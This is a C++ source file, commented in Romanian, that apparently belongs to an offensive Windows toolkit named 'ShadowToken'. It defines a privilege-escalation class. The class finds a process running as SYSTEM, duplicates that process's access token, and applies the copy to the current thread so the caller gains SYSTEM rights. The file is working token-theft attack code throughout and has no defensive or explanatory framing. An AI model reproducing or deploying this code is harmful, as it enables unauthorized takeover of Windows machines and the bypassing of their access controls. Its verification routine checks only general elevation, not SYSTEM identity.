#include <Windows.h>
#include <iostream>
#include "../core/token_manipulation.cpp"
#include "../process_enumeration/process_enumeration.cpp"

namespace ShadowToken {

    class PrivilegeEscalator {
    public:
        PrivilegeEscalator(const std::vector<std::wstring>& highProfileProcesses)
            : tokenManipulator(), processEnumerator(highProfileProcesses) {}

        // Funcția principală pentru escaladarea privilegiilor prin injectarea token-ului SYSTEM
        bool EscalateToSystem() {
            // Selectează un proces țintă cu privilegii SYSTEM
            ProcessInfo targetProcess = processEnumerator.SelectTargetProcess();
            if (targetProcess.processID == 0) {
                std::cerr << "[Error] Nu a fost găsit un proces valid pentru escaladarea privilegiilor." << std::endl;
                return false;
            }

            // Deschide token-ul procesului țintă și duplică-l
            HANDLE targetToken = tokenManipulator.OpenProcessToken(targetProcess.processID);
            if (!targetToken) {
                std::cerr << "[Error] Nu s-a putut deschide token-ul pentru procesul țintă." << std::endl;
                return false;
            }

            HANDLE systemToken = tokenManipulator.DuplicateTokenWithPrivileges(targetToken);
            CloseHandle(targetToken);
            if (!systemToken) {
                std::cerr << "[Error] Nu s-a putut duplica token-ul cu privilegii SYSTEM." << std::endl;
                return false;
            }

            // Injectează token-ul SYSTEM în thread-ul curent
            if (!ImpersonateSystemToken(systemToken)) {
                CloseHandle(systemToken);
                return false;
            }

            std::cout << "[Success] Escaladarea privilegiilor la nivel SYSTEM a fost realizată cu succes!" << std::endl;
            CloseHandle(systemToken);
            return true;
        }

    private:
        TokenManipulator tokenManipulator;
        ProcessEnumerator processEnumerator;

        // Setează token-ul SYSTEM pentru thread-ul curent pentru a obține privilegii SYSTEM
        bool ImpersonateSystemToken(HANDLE systemToken) {
            if (!SetThreadToken(nullptr, systemToken)) {
                std::cerr << "[Error] Nu s-a putut aplica token-ul SYSTEM: " << GetLastError() << std::endl;
                return false;
            }

            // Confirmă privilegii SYSTEM verificând token-ul efectiv
            if (!VerifySystemPrivilege()) {
                std::cerr << "[Error] Verificarea privilegiului SYSTEM a eșuat." << std::endl;
                RevertToSelf();  // Curăță impostura
                return false;
            }

            return true;
        }

        // Verifică dacă thread-ul curent are privilegii SYSTEM
        bool VerifySystemPrivilege() {
            HANDLE threadToken;
            if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadToken)) {
                std::cerr << "[Error] Nu s-a putut deschide token-ul thread-ului pentru verificare: " << GetLastError() << std::endl;
                return false;
            }

            TOKEN_ELEVATION tokenElevation;
            DWORD returnLength;
            bool isSystem = GetTokenInformation(threadToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &returnLength) &&
                            tokenElevation.TokenIsElevated;
            CloseHandle(threadToken);
            return isSystem;
        }
    };
}
